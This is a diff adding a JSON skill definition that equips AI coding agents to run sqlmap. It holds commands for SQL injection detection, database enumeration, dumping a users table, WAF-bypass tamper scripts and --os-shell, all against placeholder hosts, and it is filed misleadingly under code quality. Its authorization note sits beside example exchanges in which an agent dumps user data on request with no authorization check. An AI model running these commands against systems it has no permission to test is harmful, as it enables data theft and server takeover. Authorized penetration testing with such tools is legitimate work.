@@ -1,0 +1,171 @@
+{
+  "name": "sqlmap",
+  "display_name": "Sqlmap",
+  "category": "code-quality",
+  "subcategory": "general",
+  "description": "Automated SQL injection testing with sqlmap: detection, database enumeration, and data extraction.",
+  "version": "2.0.0",
+  "tags": [
+    "code-quality"
+  ],
+  "author": "Kdesk-Catalog",
+  "license": "MIT",
+  "prerequisites": [
+    "sqlmap"
+  ],
+  "capabilities": [
+    {
+      "name": "sqlmap-injection",
+      "description": "Detect and exploit SQL injection, enumerate databases and tables, and dump data",
+      "commands": [
+        "sqlmap -u \"http://target.example.com/item?id=1\" --batch",
+        "sqlmap -u \"http://target.example.com/item?id=1\" --dbs",
+        "sqlmap -u \"http://target.example.com/item?id=1\" -D appdb --tables",
+        "sqlmap -u \"http://target.example.com/item?id=1\" -D appdb -T users --dump --threads=4",
+        "sqlmap -r request.txt --level=3 --risk=2 --tamper=space2comment"
+      ],
+      "examples": [
+        "sqlmap -u \"http://target?id=1\" --current-user --current-db",
+        "sqlmap -u \"http://target?id=1\" --os-shell",
+        "sqlmap -u \"http://target?id=1\" --batch --smart"
+      ],
+      "parameters": [
+        {
+          "name": "level",
+          "type": "integer",
+          "description": "Test intensity 1-5 (5 = full payload set)"
+        },
+        {
+          "name": "risk",
+          "type": "integer",
+          "description": "Risk of payloads 1-3 (3 includes time-based/OR payloads)"
+        },
+        {
+          "name": "tamper",
+          "type": "string",
+          "description": "Tamper scripts to bypass WAF, e.g. space2comment"
+        }
+      ]
+    }
+  ],
+  "knowledge": [
+    {
+      "title": "sqlmap wiki",
+      "type": "documentation",
+      "source": "https://github.com/sqlmapproject/sqlmap/wiki",
+      "description": "Full usage documentation for every option"
+    },
+    {
+      "title": "sqlmap usage",
+      "type": "documentation",
+      "source": "https://sqlmap.org/",
+      "description": "Project site with getting-started examples"
+    }
+  ],
+  "instructions": "# sqlmap\n\nOpen-source penetration testing tool that automates detecting and exploiting SQL\ninjection flaws and taking over database servers.\n\n## When to Use\n\n- Authorized penetration tests of web applications\n- Confirming a suspected SQL injection point\n- Extracting schema and data for proof of exploitation\n\n## Real Commands\n\n```bash\n# Basic detection (non-interactive)\nsqlmap -u \"http://target.example.com/item?id=1\" --batch\n\n# Enumerate databases\nsqlmap -u \"http://target.example.com/item?id=1\" --dbs\n\n# Tables in a database\nsqlmap -u \"http://target.example.com/item?id=1\" -D appdb --tables\n\n# Dump a table\nsqlmap -u \"http://target.example.com/item?id=1\" -D appdb -T users --dump --threads=4\n\n# From a captured request file\nsqlmap -r request.txt --level=3 --risk=2\n\n# WAF bypass with tamper scripts\nsqlmap -u \"http://target?id=1\" --tamper=space2comment\n\n# Current user/db info\nsqlmap -u \"http://target?id=1\" --current-user --current-db --batch\n```\n\n## Responsibility Notes\n\n- Only test systems you own or have written permission to test\n- Use `--batch` to accept defaults safely during scripted runs\n- Start with `--level 1 --risk 1` and increase gradually\n- The tool can cause data loss on fragile backends (e.g. `--drop-set-cookie`)\n\n## Best Practices\n\n- Capture the request with the exact parameters (cookie, CSRF) via `-r` file\n- Always dump to a file: `--dump -o results`\n- Check `--technique=BET` to limit to Boolean/Error/Time tests if speed matters\n\n## Example Response\n\nConfirms injection point, backend DBMS and version, then enumerates databases,\ntables, and dumps rows with the extracted payload used.",
+  "examples": [
+    {
+      "input": "Test this URL for SQL injection",
+      "output": "Runs sqlmap -u \"http://target?id=1\" --batch --dbs and reports the DBMS plus found databases"
+    },
+    {
+      "input": "Extract users table to prove the finding",
+      "output": "Runs sqlmap -u \"http://target?id=1\" -D appdb -T users --dump --threads=4 and summarizes the leaked columns"
+    }
+  ],
+  "platforms": {
+    "claude_code": {
+      "tools": [
+        "Bash",
+        "Read",
+        "Write",
+        "Edit"
+      ],
+      "model": "inherit"
+    },
+    "cursor": {
+      "rule_type": "auto"
+    },
+    "github_copilot": {
+      "prompt_file": "sqlmap.md",
+      "extension": "github.copilot"
+    },
+    "windsurf": {
+      "model": "inherit",
+      "tools": [
+        "bash",
+        "read",
+        "write",
+        "edit"
+      ]
+    },
+    "opencode": {
+      "plugin": "opencode-sqlmap"
+    },
+    "generic": {
+      "system_prompt": "You take the Sqlmap seat. You do it through sqlmap-injection: Detect and exploit SQL injection, enumerate databases and tables, and dump data. The commands are real, e.g. `sqlmap -u http://target.example.com/item?id=1 --batch`. You answer with exact commands, not abstractions, and flag anything you have not verified yourself.",
+      "available_tools": [
+        "bash",
+        "read",
+        "write",
+        "edit"
+      ]
+    }
+  },
+  "created_at": "2024-01-01T00:00:00Z",
+  "updated_at": "2024-01-01T00:00:00Z",
+  "id": "sqlmap",
+  "type": "skill",
+  "skills": [],
+  "tools": [
+    "Bash",
+    "Read",
+    "Write",
+    "Edit"
+  ],
+  "inputs": {
+    "parameters": [
+      {
+        "capability": "sqlmap-injection",
+        "name": "level",
+        "type": "integer",
+        "description": "Test intensity 1-5 (5 = full payload set)"
+      },
+      {
+        "capability": "sqlmap-injection",
+        "name": "risk",
+        "type": "integer",
+        "description": "Risk of payloads 1-3 (3 includes time-based/OR payloads)"
+      },
+      {
+        "capability": "sqlmap-injection",
+        "name": "tamper",
+        "type": "string",
+        "description": "Tamper scripts to bypass WAF, e.g. space2comment"
+      }
+    ]
+  },
+  "outputs": {},
+  "dependencies": [
+    "sqlmap"
+  ],
+  "conversion": {
+    "tool": "Kdesk-Catalog yaml-to-json",
+    "schema": "definition-v1",
+    "source_yaml": "code-quality/sqlmap-skill.yaml",
+    "derived": {
+      "skills": "none",
+      "tools": "platforms.claude_code.tools",
+      "inputs": "capability.parameters",
+      "outputs": "none (not present in source YAML)",
+      "dependencies": "prerequisites"
+    }
+  },
+  "_provenance": {
+    "generated_by": "Kdesk-Catalog yaml-to-json",
+    "generator_version": "1.0.0",
+    "schema": "definition-v1",
+    "source": "universal-agents/code-quality/sqlmap-skill.yaml",
+    "checksum": "fa8da6de53789370e03db042ea370988efde759fa8d818a3ae10368cbc3c70c1"
+  }
+}
